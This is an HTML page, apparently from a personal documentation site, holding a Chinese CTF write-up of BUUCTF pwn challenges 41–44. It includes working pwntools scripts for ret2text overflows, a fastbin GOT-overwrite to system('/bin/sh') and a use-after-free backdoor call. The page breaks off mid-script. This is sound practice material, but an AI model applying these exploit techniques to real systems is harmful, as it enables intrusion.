+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_6" id="__nav_4_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_6">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../basectf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BaseCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../moectf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MoeCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../isctf2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISCTF2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ghctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    GHCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../xyctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    XYCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tgctf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TGCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../NPCCTF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    NPCCTF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ctfshow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CTFShow
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../whuctf2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WHUCTF2024
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../whuctf2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    WHUCTF2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%E5%BC%BA%E7%BD%91%E6%9D%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    强网杯
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../polarD%26N/polarD%26N/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PolarD&N
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_6_13" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_6_13" id="__nav_4_6_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    BUUCTF
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_6_13_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_6_13">
+            <span class="md-nav__icon md-icon"></span>
+            BUUCTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%881-20%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    1-20题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    21-40题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    41-60题
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    41-60题
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#41-picoctf_2018_buffer-overflow-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      41 picoctf_2018_buffer overflow 1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#42-jarvisoj_test_your_memory" class="md-nav__link">
+    <span class="md-ellipsis">
+      42 jarvisoj_test_your_memory
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#43-zjctf-2019easyheap" class="md-nav__link">
+    <span class="md-ellipsis">
+      43 [ZJCTF 2019]EasyHeap
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    61-80题
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    一些零碎
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            一些零碎
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../sth/proj/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    project
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    功能测试页
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            功能测试页
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../testpage/test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    test
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#41-picoctf_2018_buffer-overflow-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      41 picoctf_2018_buffer overflow 1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#42-jarvisoj_test_your_memory" class="md-nav__link">
+    <span class="md-ellipsis">
+      42 jarvisoj_test_your_memory
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#43-zjctf-2019easyheap" class="md-nav__link">
+    <span class="md-ellipsis">
+      43 [ZJCTF 2019]EasyHeap
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+  
+                  
+
+
+
+<h1 id="buu41-60">buu刷题记录（41-60题）</h1>
+<p>by Maple</p>
+<h2 id="41-picoctf_2018_buffer-overflow-1">41 picoctf_2018_buffer overflow 1</h2>
+<p><strong><em>ret2text</em></strong></p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;./libc.so.6&quot;)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29931</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x80485CB</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="42-jarvisoj_test_your_memory">42 jarvisoj_test_your_memory</h2>
+<p><strong><em>ret2text</em></strong></p>
+<p>别看题上那些有的没的，有个溢出点，有个<code>system</code>,还有<code>cat flag</code>字符串，直接构造rop</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">LibcSearcher</span><span class="w"> </span><span class="kn">import</span> <span class="n">LibcSearcher</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">ctypes</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./pwn&quot;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&quot;./libc.so.6&quot;)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27254</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">sys</span> <span class="o">=</span> <span class="mh">0x80485C9</span>
+<span class="n">flag_addr</span> <span class="o">=</span> <span class="mh">0x80487E0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x13</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="43-zjctf-2019easyheap">43 [ZJCTF 2019]EasyHeap</h2>
+<h1 id="fastbin">fastbin</h1>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701212438863.png" src="../../../images/image-20250701212438863.png" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>简单的菜单，增、改、删</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701212528873.png" src="../../../images/image-20250701212528873.png" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>删除函数，这里置零了，没办法uaf</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701212620115.png" src="../../../images/image-20250701212620115.png" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>增，最多10个</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701212732739.png" src="../../../images/image-20250701212732739.png" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>改，v2不受限，有堆溢出漏洞</td>
+</tr>
+</tbody>
+</table>
+<p>同时我们看到一个不能实现的后门函数，虽然不能实现，但是为我们提供了<code>system</code>和<code>/bin/sh</code></p>
+<p>那么我们如果覆盖调用函数，将free的got表换为system的plt表，就可以在使用free时，使用的是system</p>
+<p><strong>利用过程</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">creat</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">creat</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
+<span class="n">creat</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="p">)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701213934519.png" src="../../../images/image-20250701213934519.png" /></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>通过查ida我们可以知道heaparry的地址是<code>0x6020e0</code>,那么查一下看看。但是这里不能伪装堆块，因为没有记录大小，所以我们再找找有没有合适的</td>
+</tr>
+<tr>
+<td><img alt="image-20250701214050927.png" src="../../../images/image-20250701214050927.png" />](../../images/image-20250701214050927.png)</td>
+</tr>
+<tr>
+<td>欸，找到了这个7f，那么我们可以借助这个，伪造出来一个大小为0x7f的堆块</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="c1">#释放到fastbin中，进行fastbin attack，具体方式是修改fd为heap指针附近的地址</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x60</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020ad</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#在heap1中写binsh，0x6020ad是修改fd为刚才定位到的fake heap（0x6020e0-0x33)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250702183951930.png" src="../../../images/image-20250702183951930.png" />](../../images/image-20250702183951930.png)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>操作后如下所示，释放的空间有了fd、也有了size</td>
+</tr>
+</tbody>
+</table>
+<p>接下来我们就有了一个可以随意操作的堆了，那么按照先前的思路，修改free罢</p>
+<div class="highlight"><pre><span></span><code><span class="n">creat</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">creat</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>    <span class="c1">#创建fake heap，实际上是指针数组前面0x33</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x23</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span>    <span class="c1">#前面已经有0x10用来存堆头了</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">payload2</span><span class="p">)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250702190356745.png" src="../../../images/image-20250702190356745.png" />](../../images/image-20250702190356745.png)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>这里是执行完后的堆，可以发现啊，这里指针变为了0x602018（free的got表地址）</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><span class="n">payload3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span>  <span class="c1">#覆盖free的got为system的plt</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload3</span><span class="p">)</span>
+</code></pre></div>
+<p>这样的话，在调用free时，是先找free的plt表，然后跳转到fre的got表再执行一次跳转，此时把free的got表改为system的plt，就会凋到system去执行</p>
+<div class="highlight"><pre><span></span><code><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<p>这里其实是执行system（‘/bin/sh’)</p>
+<h2 id="44-hitcontraining_uaf">44 hitcontraining_uaf</h2>
+<h1 id="uaf">uaf</h1>
+<p><code>uaf（use after free）</code>：free是指函数在堆上动态分配空间后不再使用该数据从而被回收，但是由于一些不当操作，导致攻击者可以操控已经被释放的区域，从而执行一些<code>byte codes</code></p>
+<p>它的使用有以下几个条件;</p>
+<ul>
+<li>在free函数被调用回收buffer之后，指向该地址的指针是否被重置</li>
+<li>后续是否存在malloc函数可以将新申请分配的空间分配到之前被free()回收的buffer区域</li>
+<li>利用没有被重置的指针进行攻击</li>
+</ul>
+<p>接下来看一下这道题：</p>
+<p><img alt="image-20250701193147459.png" src="../../../images/image-20250701193147459.png" /></p>
+<p>三个功能分别是增、删、输出；同时还有一个后门函数，地址为<code>0x8048945</code></p>
+<p>阅读一下<code>add</code>函数</p>
+<p><img alt="image-20250701193334069.png" src="../../../images/image-20250701193334069.png" /></p>
+<p>这里在关键部分写了一些注释，我们可以看到，这一个函数创建了两个堆块，分别是存放函数指针的8字节堆块和存放内容的堆块，做出示意图如下</p>
+<p><img alt="image-20250701193457974.png" src="../../../images/image-20250701193457974.png" /></p>
+<p>查看<code>delete</code>函数</p>
+<p><img alt="image-20250701193613338.png" src="../../../images/image-20250701193613338.png" /></p>
+<p>查看<code>print</code>函数</p>
+<p><img alt="image-20250701193711173.png" src="../../../images/image-20250701193711173.png" /></p>
+<p>执行了前面的一个puts函数，里面是内容</p>
+<p><strong>那么很容易想到，我们能不能让这个指向<code>put_note</code>的函数，变为指向后门的函数，这样就可以直接执行后门了</strong></p>
+<p>由于fastbin的机制，我们free掉申请的这两个块时，会产生的情况如下;</p>
+<div class="highlight"><pre><span></span><code>8字节的chunk1指针 -&gt; chunk0指针 -&gt; tail
+n(&lt;40字节) -&gt; chunk1 -&gt; chunk0 -&gt; tail
+</code></pre></div>
+<p>那么我们malloc的时候，size选择0x8，add函数中先分配指针的堆块，然后分配content的堆块</p>
+<div class="highlight"><pre><span></span><code>8字节的chunk0 -&gt; tail
+chunk2的指针 == chunk1指针
+chunk2_content == chunk0指针
+</code></pre></div>
+<p>因此打印<code>chunk0</code>的时候，<code>chunk0</code>的函数指针会指向<code>chunk2</code>的<code>content</code>,如果之前传入了后门函数，那就可以顺利执行</p>
+<p><strong>详细过程</strong></p>
+<p>首先我们写入两个大堆看看</p>
+<div class="highlight"><pre><span></span><code><span class="n">add</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span><span class="s1">&#39;bbb&#39;</span><span class="p">)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701200211166.png" src="../../../images/image-20250701200211166.png" />](../../images/image-20250701200211166.png)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>紫色是第一个put_note；  绿色是第一块堆的内容；  深蓝色是第二个put_note;  黄色是第二块堆的内容</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701200251760.png" src="../../../images/image-20250701200251760.png" />](../../images/image-20250701200251760.png)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>释放之后堆到了tcache bin中</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x8048945</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">magic</span><span class="p">))</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th><img alt="image-20250701200511537.png" src="../../../images/image-20250701200511537.png" />](../../images/image-20250701200511537.png)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>清晰的看到深蓝色这里被写入了新的put_node；  这是因为Tache的后进先出原则，蓝色被分配用于存放put_note函数和参数</td>
+</tr>
+<tr>
+<td><img alt="image-20250701200730288.png" src="../../../images/image-20250701200730288.png" />](../../images/image-20250701200730288.png)</td>
+</tr>
+<tr>
+<td>执行下一步：可以看到，紫色部分也被修改了。因为紫色用于我们申请的内存，并且写入magic地址，并且这里本来应该执行put_note函数的，这里执行了后门函数，因此可以getshell</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="s1">&#39;wt.exe -d . wsl.exe -d Ubuntu&#39;</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;node5.buuoj.cn&#39;</span>
+<span class="n">post</span> <span class="o">=</span> <span class="mi">26483</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1">#p = remote(host,post)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&#39;./pwn&#39;)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="mh">0x8048945</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Note size :&#39;</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Content :&#39;</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice :&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
